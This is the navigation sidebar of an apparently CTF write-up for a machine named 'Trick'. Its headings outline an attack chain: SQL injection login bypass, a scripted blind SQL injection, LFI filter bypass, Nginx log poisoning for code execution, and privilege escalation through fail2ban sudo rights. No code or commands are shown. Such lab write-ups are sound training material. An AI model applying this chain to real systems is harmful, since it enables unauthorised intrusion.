data-path="#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Discovering Routes and Resources Using `dirsearch`">TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-trick.html#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Authentication_Panel_Bypass_via_SQL_Injection_(SQLi)_0" data-path="#TCP_Port_80_Authentication_Panel_Bypass_via_SQL_Injection_(SQLi)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Authentication Panel Bypass via SQL Injection (SQLi)">TCP Port 80: Authentication Panel Bypass via SQL Injection (SQLi)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Blind_Boolean‚ÄëBased_SQL_Injection_(SQLi)_Automated_with_a_Python_Script_0" data-path="#TCP_Port_80_Blind_Boolean‚ÄëBased_SQL_Injection_(SQLi)_Automated_with_a_Python_Script_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Blind Boolean‚ÄëBased SQL Injection (SQLi) Automated with a Python Script">TCP Port 80: Blind Boolean‚ÄëBased SQL Injection (SQLi) Automated with a Python Script</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Displaying_the_Administrator's_Password_by_Manipulating_the_HTML_Code_0" data-path="#TCP_Port_80_Displaying_the_Administrator's_Password_by_Manipulating_the_HTML_Code_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Displaying the Administrator's Password by Manipulating the HTML Code">TCP Port 80: Displaying the Administrator's Password by Manipulating the HTML Code</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Subdomain_Enumeration_Using_`wfuzz`_0" data-path="#TCP_Port_80_Subdomain_Enumeration_Using_`wfuzz`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Subdomain Enumeration Using `wfuzz`">TCP Port 80: Subdomain Enumeration Using <code>wfuzz</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Local_File_Inclusion_(LFI)_via_Bypassing_the_`../`_Removal_Pattern_0" data-path="#TCP_Port_80_Local_File_Inclusion_(LFI)_via_Bypassing_the_`../`_Removal_Pattern_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Local File Inclusion (LFI) via Bypassing the `../` Removal Pattern">TCP Port 80: Local File Inclusion (LFI) via Bypassing the <code>../</code> Removal Pattern</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_LFI_to_RCE_-_Nginx_Log_Poisoning_0" data-path="#TCP_Port_80_LFI_to_RCE_-_Nginx_Log_Poisoning_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: LFI to RCE - Nginx Log Poisoning">TCP Port 80: LFI to RCE - Nginx Log Poisoning</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-trick.html#Post-Exploitation_0" data-path="#Post-Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation">Post-Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#User_Flag_0" data-path="#User_Flag_0"><div class="tree-item-inner heading-link" heading-name="User Flag">User Flag</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-trick.html#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-trick.html#Abusing_Sudoers_Privileges_by_Modifying_``fail2ban``_Actionban_Setting_0" data-path="#Abusing_Sudoers_Privileges_by_Modifying_``fail2ban``_Actionban_Setting_0"><div class="tree-item-inner heading-link" heading-name="Abusing Sudoers Privileges by Modifying ``fail2ban`` Actionban Setting">Abusing Sudoers Privileges by Modifying <code>fail2ban</code> Actionban Setting</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#Root_Flag_0" data-path="#Root_Flag_0"><div class="tree-item-inner heading-link" heading-name="Root Flag">Root Flag</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-trick.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>
